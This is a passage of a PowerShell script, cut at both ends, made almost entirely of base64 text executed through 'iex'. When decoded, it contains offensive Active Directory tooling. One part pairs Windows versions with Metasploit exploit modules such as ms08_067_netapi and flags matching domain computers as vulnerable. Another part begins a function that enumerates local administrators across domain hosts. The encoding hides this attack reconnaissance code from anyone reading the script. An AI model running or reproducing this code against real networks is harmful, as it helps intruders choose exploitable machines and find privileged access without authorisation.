AxIiwiZXhwbG9pdC93aW5kb3dzL3dpbnMvbXMwNF8wNDVfd2lucyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDQtMTA4MC8iKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAzIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDdfMDI5X21zZG5zX3pvbmVuYW1lIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNy0xNzQ4IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMyIsIlNlcnZpY2UgUGFjayAyIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA4LTQyNTAiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAzIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMTBfMDYxX3Nwb29sc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDEwLTI3MjkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDAzIiwiIiwiZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29tIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDMiLCIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDZfMDQwX25ldGFwaSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDYtMzQzOSIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDMiLCIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDhfMDY3X25ldGFwaSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDgtNDI1MCIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDMiLCIiLCJleHBsb2l0L3dpbmRvd3Mvd2lucy9tczA0XzA0NV93aW5zIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNC0xMDgwLyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDMgUjIiLCIiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDNfMDI2X2Rjb20iLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTAzNTIvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMyBSMiIsIiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNF8wMTFfbHNhc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTA1MzMvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMyBSMiIsIiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNl8wNDBfbmV0YXBpIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwNi0zNDM5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwMyBSMiIsIiIsImV4cGxvaXQvd2luZG93cy93aW5zL21zMDRfMDQ1X3dpbnMiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA0LTEwODAvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwOCIsIlNlcnZpY2UgUGFjayAyIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4IiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAzIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwOCIsIlNlcnZpY2UgUGFjayAyIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNzIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwOCIsIiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwOF8wNjdfbmV0YXBpIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUwIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBTZXJ2ZXIgMjAwOCIsIiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwOV8wNTBfc21iMl9uZWdvdGlhdGVfZnVuY19pbmRleCIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDktMzEwMyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgU2VydmVyIDIwMDgiLCIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMTBfMDYxX3Nwb29sc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDEwLTI3MjkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFNlcnZlciAyMDA4IFIyIiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNzIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBWaXN0YSIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDhfMDY3X25ldGFwaSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDgtNDI1MCIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgVmlzdGEiLCJTZXJ2ZXIgUGFjayAxIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4IiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAzIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBWaXN0YSIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMTBfMDYxX3Nwb29sc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDEwLTI3MjkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFZpc3RhIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDlfMDUwX3NtYjJfbmVnb3RpYXRlX2Z1bmNfaW5kZXgiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA5LTMxMDMiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFZpc3RhIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMTBfMDYxX3Nwb29sc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDEwLTI3MjkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFZpc3RhIiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA4LTQyNTAiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFZpc3RhIiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA5XzA1MF9zbWIyX25lZ290aWF0ZV9mdW5jX2luZGV4IiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOS0zMTAzIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBYUCIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDNfMDI2X2Rjb20iLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTAzNTIvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBYUCIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiU2VydmVyIFBhY2sgMSIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNF8wMTFfbHNhc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDAzLTA1MzMvIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBYUCIsIlNlcnZlciBQYWNrIDEiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDVfMDM5X3BucCIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDUtMTk4MyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgWFAiLCJTZXJ2ZXIgUGFjayAxIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA2LTM0MzkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDZfMDQwX25ldGFwaSIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDYtMzQzOSIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgWFAiLCJTZXJ2aWNlIFBhY2sgMiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwNl8wNjZfbndhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA2LTQ2ODgiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiU2VydmljZSBQYWNrIDIiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMDZfMDcwX3drc3N2YyIsImh0dHA6Ly93d3cuY3ZlZGV0YWlscy5jb20vY3ZlLzIwMDYtNDY5MSIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgWFAiLCJTZXJ2aWNlIFBhY2sgMiIsImV4cGxvaXQvd2luZG93cy9zbWIvbXMwOF8wNjdfbmV0YXBpIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwOC00MjUwIikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBYUCIsIlNlcnZpY2UgUGFjayAyIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczEwXzA2MV9zcG9vbHNzIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAxMC0yNzI5IikgIAogICAgJE51bGwgPSAkVGFibGVFeHBsb2l0cy5Sb3dzLkFkZCgiV2luZG93cyBYUCIsIlNlcnZpY2UgUGFjayAzIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA4LTQyNTAiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiU2VydmljZSBQYWNrIDMiLCJleHBsb2l0L3dpbmRvd3Mvc21iL21zMTBfMDYxX3Nwb29sc3MiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDEwLTI3MjkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiIiwiZXhwbG9pdC93aW5kb3dzL2RjZXJwYy9tczAzXzAyNl9kY29tIiwiaHR0cDovL3d3dy5jdmVkZXRhaWxzLmNvbS9jdmUvMjAwMy0wMzUyLyIpICAKICAgICROdWxsID0gJFRhYmxlRXhwbG9pdHMuUm93cy5BZGQoIldpbmRvd3MgWFAiLCIiLCJleHBsb2l0L3dpbmRvd3MvZGNlcnBjL21zMDVfMDE3X21zbXEiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA1LTAwNTkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA2XzA0MF9uZXRhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA2LTM0MzkiKSAgCiAgICAkTnVsbCA9ICRUYWJsZUV4cGxvaXRzLlJvd3MuQWRkKCJXaW5kb3dzIFhQIiwiIiwiZXhwbG9pdC93aW5kb3dzL3NtYi9tczA4XzA2N19uZXRhcGkiLCJodHRwOi8vd3d3LmN2ZWRldGFpbHMuY29tL2N2ZS8yMDA4LTQyNTAiKSAgCiAgICBXcml0ZS1WZXJib3NlICJbKl0gQ2hlY2tpbmcgY29tcHV0ZXJzIGZvciB2dWxuZXJhYmxlIE9TIGFuZCBTUCBsZXZlbHMuLi4iCiAgICAkVGFibGVWdWxuQ29tcHV0ZXJzID0gTmV3LU9iamVjdCBTeXN0ZW0uRGF0YS5EYXRhVGFibGUgCiAgICAkTnVsbCA9ICRUYWJsZVZ1bG5Db21wdXRlcnMuQ29sdW1ucy5BZGQoJ0NvbXB1dGVyTmFtZScpCiAgICAkTnVsbCA9ICRUYWJsZVZ1bG5Db21wdXRlcnMuQ29sdW1ucy5BZGQoJ09wZXJhdGluZ1N5c3RlbScpCiAgICAkTnVsbCA9ICRUYWJsZVZ1bG5Db21wdXRlcnMuQ29sdW1ucy5BZGQoJ1NlcnZpY2VQYWNrJykKICAgICROdWxsID0gJFRhYmxlVnVsbkNvbXB1dGVycy5Db2x1bW5zLkFkZCgnTGFzdExvZ29uJykKICAgICROdWxsID0gJFRhYmxlVnVsbkNvbXB1dGVycy5Db2x1bW5zLkFkZCgnTXNmTW9kdWxlJykKICAgICROdWxsID0gJFRhYmxlVnVsbkNvbXB1dGVycy5Db2x1bW5zLkFkZCgnQ1ZFJykKICAgICRUYWJsZUV4cGxvaXRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICRFeHBsb2l0T1MgPSAkXy5PcGVyYXRpbmdTeXN0ZW0KICAgICAgICAkRXhwbG9pdFNQID0gJF8uU2VydmljZVBhY2sKICAgICAgICAkRXhwbG9pdE1zZiA9ICRfLk1zZk1vZHVsZQogICAgICAgICRFeHBsb2l0Q1ZFID0gJF8uQ1ZFCiAgICAgICAgJFRhYmxlQWRzQ29tcHV0ZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkQWRzSG9zdG5hbWUgPSAkXy5Ib3N0bmFtZQogICAgICAgICAgICAkQWRzT1MgPSAkXy5PcGVyYXRpbmdTeXN0ZW0KICAgICAgICAgICAgJEFkc1NQID0gJF8uU2VydmljZVBhY2sgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAkQWRzTGFzdCA9ICRfLkxhc3RMb2dvbgogICAgICAgICAgICBpZiAoJEFkc09TIC1saWtlICIkRXhwbG9pdE9TKiIgLWFuZCAkQWRzU1AgLWxpa2UgIiRFeHBsb2l0U1AiICkgeyAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkTnVsbCA9ICRUYWJsZVZ1bG5Db21wdXRlcnMuUm93cy5BZGQoJEFkc0hvc3RuYW1lLCRBZHNPUywkQWRzU1AsJEFkc0xhc3QsJEV4cGxvaXRNc2YsJEV4cGxvaXRDVkUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9ICAgICAKICAgICRWdWxuQ29tcHV0ZXIgPSAkVGFibGVWdWxuQ29tcHV0ZXJzIHwgU2VsZWN0LU9iamVjdCBDb21wdXRlck5hbWUgLVVuaXF1ZSB8IE1lYXN1cmUtT2JqZWN0CiAgICAkVnVsbkNvbXB1dGVyQ291bnQgPSAkVnVsbkNvbXB1dGVyLkNvdW50CiAgICBpZiAoJFZ1bG5Db21wdXRlci5Db3VudCAtZ3QgMCkgewogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsrXSBGb3VuZCAkVnVsbkNvbXB1dGVyQ291bnQgcG90ZW50aWFsbHkgdnVsbmVyYWJsZSBzeXN0ZW1zISIKICAgICAgICAkVGFibGVWdWxuQ29tcHV0ZXJzIHwgU29ydC1PYmplY3QgeyAkXy5sYXN0bG9nb24gLWFzIFtkYXRldGltZV19IC1EZXNjZW5kaW5nCiAgICB9CiAgICBlbHNlIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJbLV0gTm8gdnVsbmVyYWJsZSBzeXN0ZW1zIHdlcmUgZm91bmQuIgogICAgfQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gSW52b2tlLUVudW1lcmF0ZUxvY2FsQWRtaW4gewogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCxWYWx1ZUZyb21QaXBlbGluZT0kVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0cycpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lLAogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7VGVzdC1QYXRoIC1QYXRoICRfIH0pXQogICAgICAgIFtBbGlhcygnSG9zdExpc3QnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlckZpbGUsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJGaWx0ZXIsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJBRFNwYXRoLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE5vUGluZywKICAgICAgICBbVUludDMyXQogICAgICAgICREZWxheSA9IDAsCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkT3V0RmlsZSwKICAgICAgICBbU3dpdGNoXQogICAgICAgICROb0Nsb2JiZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVHJ1c3RHcm91cHMsCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbkNvbnRyb2xsZXIsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2VhcmNoRm9yZXN0LAogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsMTAwKV0gCiAgICAgICAgW0ludF0KICAgICAgICAkVGhyZWFkcwogICAgKQogICAgYmVnaW4gewogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RlYnVnJ10pIHsKICAgICAgICAgICAgJERlYnVnUHJlZmVyZW5jZSA9ICdDb250aW51ZScKICAgICAgICB9CiAgICAgICAgJFJhbmRObyA9IE5ldy1PYmplY3QgU3lzdGVtLlJhbmRvbQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBSdW5uaW5nIEludm9rZS1FbnVtZXJhdGVMb2NhbEFkbWluIHdpdGggZGVsYXkgb2YgJERlbGF5IgogICAgICAgIGlmKCEkQ29tcHV0ZXJOYW1lKSB7IAogICAgICAgICAgICBpZigkRG9tYWluKSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0RG9tYWlucyA9IEAoJERvbWFpbikKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlaWYoJFNlYXJjaEZvcmVzdCkgewogICAgICAgICAgICAgICAgJFRhcmdldERvbWFpbnMgPSBHZXQtTmV0Rm9yZXN0RG9tYWluIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5OYW1lIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRUYXJnZXREb21haW5zID0gQCggKEdldC1OZXREb21haW4pLm5hbWUgKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRDb21wdXRlckZpbGUpIHsKICAgICAgICAgICAgICAgICRDb21wdXRlck5hbWUgPSBHZXQtQ29udGVudCAtUGF0aCAkQ29tcHV0ZXJGaWxlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBbYXJyYXldJENvbXB1dGVyTmFtZSA9IEAoKQogICAgICAgICAgICAgICAgRm9yRWFjaCAoJERvbWFpbiBpbiAkVGFyZ2V0RG9tYWlucykgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBRdWVyeWluZyBkb21haW4gJERvbWFpbiBmb3IgaG9zdHMiCiAgICAgICAgICAgICAgICAgICAgJENvbXB1dGVyTmFtZSArPSBHZXQtTmV0Q29tcHV0ZXIgLUZpbHRlciAkQ29tcHV0ZXJGaWx0ZXIgLUFEU3BhdGggJENvbXB1dGVyQURTcGF0aCAtRG9tYWluICREb21haW4gLURvbWFpbkNvbnRyb2xsZXIgJERvbWFpbkNvbnRyb2xsZXIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJENvbXB1dGVyTmFtZSB8IFdoZXJlLU9iamVjdCB7ICRfIH0gfCBTb3J0LU9iamVjdCAtVW5pcXVlIHwgU29ydC1PYmplY3QgeyBHZXQtUmFuZG9tIH0KICAgICAgICAgICAgaWYoJCgkQ29tcHV0ZXJOYW1lLkNvdW50KSAtZXEgMCkgewogICAgICAgICAgICAgICAgdGhyb3cgIk5vIGhvc3RzIGZvdW5kISIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZighJE5vQ2xvYmJlcikgewogICAgICAgICAgICBpZiAoJE91dEZpbGUgLWFuZCAoVGVzdC1QYXRoIC1QYXRoICRPdXRGaWxlKSkgeyBSZW1vdmUtSXRlbSAtUGF0aCAkT3V0RmlsZSB9CiAgICAgICAgfQogICAgICAgIGlmKCRUcnVzdEdyb3VwcykgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJEZXRlcm1pbmluZyBkb21haW4gdHJ1c3QgZ3JvdXBzIgogICAgICAgICAgICAkVHJ1c3RHcm91cE5hbWVzID0gRmluZC1Gb3JlaWduR3JvdXAgLURvbWFpbiAkRG9tYWluIC1Eb21haW5Db250cm9sbGVyICREb21haW5Db250cm9sbGVyIHwgRm9yRWFjaC1PYmplY3QgeyAkXy5Hcm91cE5hbWUgfSB8IFNvcnQtT2JqZWN0IC1VbmlxdWUKICAgICAgICAgICAgJFRydXN0R3JvdXBzU0lEcyA9ICRUcnVzdEdyb3VwTmFtZXMgfCBGb3JFYWNoLU9iamVjdCB7IAogICAgICAgICAgICAgICAgR2V0LU5ldEdyb3VwIC1Eb21haW4gJERvbWFpbiAtRG9tYWluQ29udHJvbGxlciAkRG9tYWluQ29udHJvbGxlciAtR3JvdXBOYW1lICRfIC1GdWxsRGF0YSB8IFdoZXJlLU9iamVjdCB7ICRfLm9iamVjdHNpZCAtbm90bWF0Y2ggIlMtMS01LTMyLTU0NCIgfSB8IEZvckVhY2gtT2JqZWN0IHsgJF8ub2JqZWN0c2lkIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkRG9tYWluU0lEID0gR2V0LURvbWFpblNJRCAtRG9tYWluICREb21haW4KICAgICAgICB9CiAgICAgICAgJEhvc3RFbnVtQmxvY2sgPSB7CiAgICAgICAgICAgIHBhcmFtKCRDb21wdXRlck5hbWUsICRQaW5nLCAkT3V0RmlsZSwgJERvbWFpblNJRCwgJFRydXN0R3JvdXBzU0lEcykKICAgICAgICAgICAgJFVwID0gJFRydWUKICAgICAgICAgICAgaWYoJFBpbmcpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJFVwKSB7CiAgICAgICAgICAgICAgICAkTG9jYWxBZG1pbnMgPSBHZXQtTmV0TG9jYWxHcm91cCAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgICAgICAgICAgICAgIGlmKCREb21haW5TSUQgLWFuZCAkVHJ1c3RHcm91cFNJRFMpIHsKICAgICAgICAgICAgICAgICAgICAkTG9jYWxTSUQgPSAoJExvY2FsQWRtaW5zIHwgV2hlcmUtT2JqZWN0IHsgJF8uU0lEIC1tYXRjaCAnLiotNTAwJCcgfSkuU0lEIC1yZXBsYWNlICItNTAwJCIKICAgICAgICAgICAgICAgICAgICAkTG9jYWxBZG1pbnMgPSAkTG9jYWxBZG1pbnMgfCBXaGVyZS1PYmplY3QgeyAoJFRydXN0R3JvdXBzU0lEcyAtY29udGFpbnMgJF8uU0lEKSAtb3IgKCgtbm90ICRfLlNJRC5zdGFydHNXaXRoKCRMb2NhbFNJRCkpIC1hbmQgKC1ub3QgJF8uU0lELnN0YXJ0c1dpdGgoJERvbWFpblNJRCkpKSB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZigkTG9jYWxBZG1pbnMgLWFuZCAoJExvY2FsQWRtaW5zLkxlbmd0aCAtbmUgMCkpIHsKICAgICAgICAgICAgICAgICAgICBpZigkT3V0RmlsZSkgewogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxBZG1pbnMgfCBFeHBvcnQtUG93ZXJWaWV3Q1NWIC1PdXRGaWxlICRPdXRGaWxlCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxBZG1pbnMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbIV0gTm8gdXNlcnMgcmV0dXJuZWQgZnJvbSAkU2VydmVyIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgcHJvY2VzcyB7CiAgICAgICAgaWYoJFRocmVhZHMpIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkcyA9ICRUaHJlYWRzIgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdQaW5nJyA9ICQoLW5vdCAkTm9QaW5nKQogICAgICAgICAgICAgICAgJ091dEZpbGUnID0gJE91dEZpbGUKICAgICAgICAgICAgICAgICdEb21haW5TSUQnID0gJ